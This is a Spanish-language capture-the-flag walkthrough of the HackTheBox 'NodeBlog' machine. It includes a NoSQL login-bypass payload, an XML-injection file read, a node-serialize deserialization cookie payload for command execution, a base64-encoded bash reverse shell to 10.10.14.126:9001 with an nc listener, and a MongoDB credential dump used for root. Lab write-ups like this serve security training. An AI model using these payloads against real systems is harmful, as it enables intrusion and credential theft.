# EASY NODE BLOG HTB

Muy buenas a todo el mundo, mi nombre es D4l1 y hoy explicare como conseguir entender y destrozar la máquina NodeBlog

Nos encontramos con una máquina de dificultad fácil, que no por ello lo tiene que ser.

Nos encontramos con una máquina linux, ¿como lo sabemos?
Aquí tenemos dos formas:

Yo suelo utilizar mi escaner de puertos to guapo que tengo en github o simplemente con un ping. Y sabiendo los numeros tty podemos saber a que máquina nos enfrentamos 

```
ping ip
```
Posteriormente a esto y sabiendo que es una máquina Linux, lo siguiente que deberemos hacer es escanear la red en busca de puertos abiertos, versiones, scripts, etc. 

Esto lo haremos con nmap y un comando que suelo utilizar.

```
sudo nmap -sCV -T4 --min-rate 5000 -p- -Pn ip
```
En esta máquina nos encontramos dos puertos abiertos:
El puerto 22 con SSH
El puerto 5000 con Node.js 

En el que si entramos vemos un blog básico.

Podemos hacer un curl o entrar desde un navegador 

```
curl -v ip:5000
```
Vemos que utiliza el framework Express

Nos encontramos con el blog y obviamente inspeccionamos que nos encontramos, los directorios el código fuente etc.
Posteriormente encontramos un inicio de sesión, lo más obvio es probar un ataque de SQL INJECTION
Después de probar diferentes cosas  probamos el NoSQL

### NOSQL
Es un tipo de base de datos no relacional diseñada para modelos de datos, incluyendo llaves, columnas y graficos. La diferencia entre SQL y noSQL es la forma de guardar información y la estructuración de los datos.

Gracias a esta información encontramos un repositorio de bastantes payloads sobre noSQL

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass

Ahora lo que debemos hacer es que Node interprete un input de un objeto JSON, usando logicos booleanos para hacer el bypass.

# BURPSUITE

Simplemente nos iremos a la página de log, cogeremos la petición y cambiaremos el Content-Type para que acepte estar respuestas.
```
Content-Type: application/json
```
Lo enviaremos al Repeater.
Nos dan varios errores sobre /opt/blog (el código del servidor)

Ahora probaremos envede el formado predeterminado donde el usuario y la contraseña y añadiremos el payload de json 
```
{"user": "admin", "password": {"ne": "admin"}}
```
Gracias a esto conseguimos el token de autentificacion, lo ponemos en el navegador y nos redirigira a la página ya logueados.

Nos encontramos con un boton de "Upload" en el que podemos subir archivos y encontramos una injección XML

Gracias a esto podemos redirigir y leer diferentes ficheros del sistema como /etc/passwd

Anteriormente sabiamos que dentro de /opt/blog podemos leer el codigo del blog osea que vamos a ello.

En la que nos revela el siguiente codigo: 
```
const express = require('express')
const mongoose = require('mongoose')
const Article = require('./models/article')
const articleRouter = require('./routes/articles')
const loginRouter = require('./routes/login')
const serialize = require('node-serialize')
const methodOverride = require('method-override')
const fileUpload = require('express-fileupload')
const cookieParser = require('cookie-parser');
const crypto = require('crypto')
const cookie_secret = "UHC-SecretCookie"
//var session = require('express-session');
const app = express()
mongoose.connect('mongodb://localhost/blog')
app.set('view engine', 'ejs')
app.use(express.urlencoded({ extended: false }))
app.use(methodOverride('_method'))
app.use(fileUpload())
app.use(express.json());
app.use(cookieParser());
//app.use(session({secret: "UHC-SecretKey-123"}));
function authenticated(c) {
if (typeof c == 'undefined')
return false
c = serialize.unserialize(c)
if (c.sign == (crypto.createHash('md5').update(cookie_secret +
c.user).digest('hex')) ){
return true
 } else {
return false
 }
}
app.get('/', async (req, res) => {
const articles = await Article.find().sort({
createdAt: 'desc'
 })
res.render('articles/index', { articles: articles, ip: req.socket.remoteAddress,
authenticated: authenticated(req.cookies.auth) })
})
app.use('/articles', articleRouter)
app.use('/login', loginRouter)
```
Leyendo un poco por arriba nos damos cuenta que con la funcion authenticated y pasandole la cookie de usuario que anteriormente hemos conseguido, podriamos llegar a hacer algo.

Gracias a esto conseguimos la cookie 
```
{"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}
```
Aqui tenemos la primera fase del proceso que sería probar a hacer un ping con un URL encode desde la BurpSuite 

Con este payload 
```
Cookie: auth={"user":"admin","sign":"23e112072945418601deb47d9a6c7de8","haxez":"_$$ND_FUNC$$_function (){require(\"child_process\").exec(\"ping -c 4 10.10.14.126\", function(error, stdout, stderr) { console.log(stdout) });}()"}
```
Para que entendamos esto, es un payload sacado, con la simple funcion que hace un ping a nuestro ordenador para entender si nos hay una conexión y estan llegando los paquetes y tenemos la posibilidad de inyectar comandos en el servidor.

Desde nuestra máquina hariamos el comando para recibir comandos.

```
sudo tcpdump -ni tun0 icmp
```
Si esto ha salido existoso podemos pasar a hacer una reverse shell bastante simple.

```
echo -n 'bash -i  >& /dev/tcp/10.10.14.126/9001 0>&1' | base64
```
y cambiamos la funcion de nuestro ping por esta añadiendo.
```
echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTI2LzkwMDEgMD4mMQ== | base64 -d | bash
```
Desde el Get, posteriormente hacemos una escucha esde el puerto elegido en mi caso 9001
```
sudo nc -lvnp 9001
```
Y buala estamos dentro!

## PRIVILEGE ESCALATION

Para empezar vamos a enumerar el sistema con ps
```
ps auxww
```
Nos encontramos con un MongoDB al cual tenemos acceso. Puerto 27017

```
ss -tlpn 
```
Gracias a esto podemos ver que nos podemos conectar manualmente a dicha base de datos

```
mongo
```
Dentro
```
show dbs
use blog
show colletions
```
Nos encontramos con la coleccion usuarios y la leemos
```
db.users.find()
```
Aqui dentro nos encontramos la contraseña del administrador
(Cual no voy a decir)
hacemos un 
```
sudo -l
sudo su
```
Y ya ESTA!!!!




